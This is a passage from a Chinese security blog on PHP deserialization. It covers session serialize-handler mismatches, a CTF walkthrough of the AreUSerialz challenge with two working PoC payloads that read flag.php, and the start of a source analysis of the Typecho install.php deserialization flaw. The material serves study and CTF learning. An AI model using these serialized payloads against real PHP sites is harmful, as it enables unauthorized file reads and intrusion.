<h4 id="1-6-SESSION反序列化"><a href="#1-6-SESSION反序列化" class="headerlink" title="1.6 SESSION反序列化"></a>1.6 SESSION反序列化</h4><p><code>session</code>用于跟踪用户的行为，保存用户的信息和状态等等。服务器创建一个<code>sessionid</code>命名的文件，用于保存这个用户的会话信息。</p>
<p>当会话开始或通过<code>session_start()</code>开始时，<code>php</code>内部会通过传来的<code>sessionid</code>来读取文件，<code>php</code>会自动序列化<code>session</code>文件内容，并将其填充到超全局变量<code>$_SESSION</code>中。如果不存在对应的会话数据，则创建一个<code>sessionid</code>的文件。</p>
<blockquote>
<p>常见session存储位置：</p>
<p>/var/lib/php5/sess_PHPSESSID</p>
<p>/var/lib/php7/sess_PHPSESSID</p>
<p>/var/lib/php/sess_PHPSESSID </p>
<p>/tmp/sess_PHPSESSID </p>
<p>/tmp/sessions/sess_PHPSESSED</p>
</blockquote>
<p>session的<strong>存储机制</strong>：</p>
<table>
<thead>
<tr>
<th>机制</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+serialize函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名长度对应的ASCII字符+键名+serialize函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>serialize函数序列化处理的值</td>
</tr>
</tbody></table>
<p>例如：</p>
<blockquote>
<ul>
<li>Lmg|s:3:”123”; ————————-ini_set(‘session.serialize_handler’, ‘php’); php机制</li>
<li>Lmgs:3:”123”; ————————ini_set(“session.serialize_handler”, “php_binary”); php_binary机制</li>
<li>a:1:{s:3:”Lmg”;s:3:”123”;} ———–ini_set(“session.serialize_handler”, “php_serialize”); php_serialize机制</li>
</ul>
</blockquote>
<p><code>产生session反序列的原因就在程序员在读取或者存储中使用了不同的机制</code></p>
<p>举个栗子：假如存储时使用<code>php_serialize</code>机制，而读取时使用了<code>php</code>机制，那么存储时看似正常的竖线则会在读取时变为分隔符</p>
<blockquote>
<p>存储的内容：a:1:{s:3:”Lmg”;s:60:”|O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}</p>
<p>读取的内容（竖线前的内容被看作变量名）：O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}</p>
</blockquote>
<p><strong>没有$_SESSION赋值的session反序列化：</strong></p>
<p>在<code>php</code>中存在一个<code>upload_process</code>机制，可以自动创建<code>$_SESSION</code>一个键值对，而且其中的值用户可以控制，文件上传时应用可以发送一个POST请求到终端来检查这个状态</p>
<p>在上传文件时，<code>post</code>一个于<code>session.upload_process.name</code>同名的变量。后端就会自动将<code>post</code>的这个同名变量作为键，进行序列化然后存储到<code>session</code>文件中</p>
<h3 id="0x02-BUUCTF-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0x02-BUUCTF-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0x02 BUUCTF-[网鼎杯 2020 青龙组]AreUSerialz"></a>0x02 BUUCTF-[网鼎杯 2020 青龙组]AreUSerialz</h3><h4 id="2-1-源码分析"><a href="#2-1-源码分析" class="headerlink" title="2.1 源码分析"></a>2.1 源码分析</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span></code></pre>

<p>简单分析该题后，发现需要<font color=orange><code>GET</code></font>传递<font color=orange><code>str</code></font>参数，在该参数符合<font color=orange><code>is_valid()</code></font>函数校验后，对<font color=orange><code>str</code></font>反序列化。</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>那么<font color=orange><code>str</code></font>需要符合什么请求呢？在<font color=orange><code>is_valid()</code></font>函数校验中，要求<font color=orange><code>str</code></font>中的所有字符ASCII码需要在32到125之间</p>
</blockquote>
<p>接下来就是构造<font color=orange><code>str</code></font>并利用，在本题中有两个魔术方法存在：构造函数<font color=purple><code>__construct()</code></font>和析构函数<font color=purple><code>__destruct()</code></font>：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在此，可以利用析构函数，在<font color=purple><code>__destruct()</code></font>中，会判断对象的<font color=orange><code>op</code></font>属性是否等于”2”（PHP中的强类型判断，会判断变量的<font color=orange><code>type</code></font>是否也相同），并且进入<font color=orange><code>process()</code></font>中</p>
</blockquote>
<p>再查看<font color=orange><code>process()</code></font>函数：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在该函数中，判断<font color=orange><code>op</code></font>属性是否等于”2”（弱类型判断，并不会判断变量<font color=orange><code>type</code></font>是否相同），若等于，则用<font color=orange><code>read()</code></font>函数读取文件名为<font color=orange><code>filename</code></font>属性值的文件并输出</p>
</blockquote>
<h4 id="2-2-POC"><a href="#2-2-POC" class="headerlink" title="2.2 POC"></a>2.2 POC</h4><p>通过上面分析，整个利用过程就清晰了：</p>
<p>构造字符串<font color=orange><code>str</code></font>绕过<font color=orange><code>is_valid()</code></font>函数的判断，然后设置<font color=orange><code>op</code></font>属性值绕过<font color=purple><code>__destruct()</code></font>中对”2”强类型判断，将<font color=orange><code>filename</code></font>设置为想要读取的文件名</p>
<p>POC1：PHP7.1+ 版本对属性类型不敏感，本地序列化的时候将属性改为 <font color=orange><code>public</code></font>可进行绕过</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$poc1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$poc1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//str为: O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>POC2：使用16进制的\00替换空字节，采用大写的S以支持16进制的\00（好像说空格替换空字节也可以，但我没有成功）</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">00</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\00'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//由于protected属性序列化后包含空字节，将其替换为可见的"\00"</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'S'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$poc2</span><span class="token punctuation">;</span>
<span class="token comment">//str为: O:11:"FileHandler":3:&#123;S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>最后获得flag：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png" alt="image-20210430094513449" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094643.png" alt="image-20210430094448956" loading="lazy"></p>
<h3 id="0x03-Typecho反序列化漏洞复现"><a href="#0x03-Typecho反序列化漏洞复现" class="headerlink" title="0x03 Typecho反序列化漏洞复现"></a>0x03 Typecho反序列化漏洞复现</h3><h4 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h4><p>Typecho在程序安装后不会删除<font color=orange><code>install.php</code></font>，在该页面中存在反序列化漏洞</p>
<p>程序版本：<a target="_blank" rel="noopener" href="https://github.com/typecho/typecho/releases">v1.1-15.5.12-beta</a></p>
<h4 id="3-2-源码分析"><a href="#3-2-源码分析" class="headerlink" title="3.2 源码分析"></a>3.2 源码分析</h4><p>在<font color=orange><code>install.php</code></font>的第230行中，找到反序列化相关内容：将get到的<font color=orange><code>__typecho_config</code></font>进行base64解码后，再反序列化，将反序列化的结果放入了<font color=orange><code>Typecho_Db</code></font>类中</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'adapter'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addServer</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">READ</span> <span class="token operator">|</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">WRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>查看Typecho_Cookie的<font color=orange><code>get()</code></font>函数：从<font color=orange><code>cookie</code></font>或者<font color=orange><code>POST</code></font>参数中获取值，因此，可控的输入源可以从此出发</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_prefix</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$default</span> <span class="token punctuation">:</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>查看<font color=orange><code>Typecho_Db</code></font>类，其中的魔术方法有<font color=purple><code>__construct()</code></font>：在变量<font color=orange><code>$adapterName</code></font>的拼接中，将该变量作为字符串进行拼接，会触发<font color=purple><code>__toString()</code></font>魔术方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/** 获取适配器名称 */</span>
